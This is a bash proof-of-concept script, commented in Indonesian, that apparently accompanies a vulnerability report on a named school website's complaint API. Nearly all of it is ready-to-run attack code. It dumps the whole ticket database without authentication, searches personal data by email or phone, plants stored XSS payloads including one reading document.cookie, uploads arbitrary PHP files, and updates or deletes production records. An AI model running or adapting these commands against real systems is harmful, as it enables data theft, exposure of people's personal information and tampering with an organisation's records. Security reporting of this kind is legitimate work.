#!/usr/bin/env bash
# ============================================================
# PoC — E-Complaint API (smpm12gkb.sch.id)
# Companion PoC untuk REPORT-1. Black-box, unauthenticated.
#
# Usage:
#   ./poc-ecomplaint.sh dump                          # F1: unauth dump admin_get_all (preview)
#   ./poc-ecomplaint.sh view <ticket_id>              # F2: get_status — lihat field tersimpan mentah
#   ./poc-ecomplaint.sh search <email|no_hp>          # F4: search_status — PII disclosure
#   ./poc-ecomplaint.sh xss-submit                    # F2: buat tiket uji berisi payload XSS marker
#   ./poc-ecomplaint.sh upload <local_file>           # F3: submit dengan lampiran arbitrary
#   ./poc-ecomplaint.sh update <tid> <status> <note>  # F1: admin_update_status tanpa auth
#   ./poc-ecomplaint.sh delete <tid>                  # F1: admin_delete tanpa auth
#
# CATATAN: 'update' dan 'delete' menulis ke database produksi.
# Gunakan hanya pada tiket yang kamu buat sendiri (id dari xss-submit/upload).
# ============================================================
set -u

BASE_API="https://smpm12gkb.sch.id/app/page/E-Complaint/api.php"
BASE_ADMIN="https://smpm12gkb.sch.id/app/page/E-Complaint/admin.php"

case "${1:-}" in
  dump)
    # F1 — CRITICAL: seluruh database tiket tanpa autentikasi
    curl -s "$BASE_API?action=admin_get_all" | python3 -m json.tool | head -60
    ;;
  view)
    # F2 — get_status mengembalikan field mentah (raw, unescaped)
    curl -s "$BASE_API?action=get_status&ticket_id=$2" | python3 -m json.tool
    ;;
  search)
    # F4 — PII disclosure: cukup tahu email/no HP korban
    curl -s -X POST "$BASE_API" -d "action=search_status&keyword=$2" | python3 -m json.tool
    ;;
  xss-submit)
    # F2 — stored XSS: payload tersimpan mentah, tereksekusi di panel admin
    curl -s -X POST "$BASE_API" \
      -F "action=submit_complaint" \
      -F 'nama=Pentest PoC <img src=x onerror=alert(document.domain)>' \
      -F "telp=+62800000000" \
      -F "email=poc@example.com" \
      -F "jenis=Masyarakat Umum" \
      -F "lingkup=Administrasi / Keuangan" \
      -F 'keluhan=PoC stored XSS <img src=x onerror=alert(document.cookie)>' \
      -F "terms=on"
    ;;
  upload)
    # F3 — arbitrary upload: ekstensi .php dipertahankan
    curl -s -X POST "$BASE_API" \
      -F "action=submit_complaint" \
      -F "nama=PoC Upload" \
      -F "telp=+62800000000" \
      -F "email=poc@example.com" \
      -F "jenis=Masyarakat Umum" \
      -F "lingkup=Sarana Prasarana" \
      -F "keluhan=PoC upload extension test" \
      -F "terms=on" \
      -F "pendukung=@$2;type=application/x-php"
    ;;
  update)
    # F1 — write tanpa auth
    curl -s -X POST "$BASE_API" \
      -d "action=admin_update_status&tid=$2&status=$3&tindak_lanjut=$4"
    ;;
  delete)
    # F1 — delete tanpa auth
    curl -s -X POST "$BASE_API" -d "action=admin_delete&tid=$2"
    ;;
  *)
    sed -n '2,17p' "$0"
    ;;
esac
